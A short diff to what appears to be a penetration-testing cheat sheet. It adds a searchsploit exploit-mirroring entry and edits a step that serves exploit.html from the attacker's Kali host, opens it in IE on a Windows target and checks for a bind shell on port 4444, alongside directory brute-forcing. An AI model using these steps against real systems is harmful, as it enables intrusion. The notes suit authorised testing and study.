@@ -334,6 +334,11 @@ Server OS
 dirb https://target.com -r -z 10
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
+searchsploit
+   -m, --mirror   Mirror (aka copies) an exploit to the current working directory.
+   local|remote
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
 # Local Privilege Escalation - Linux
 
 ssh user@192.168.1.10
@@ -429,7 +434,7 @@ mv exploit.html /var/www/
 service apache2 start
 
 - Windows
-Open IE to <kali-ip>/exploit.html
+Open IE to <Kali IP>/exploit.html
 netstat -an:find “4444”                                             Look for a bind shell
 
 - Kali
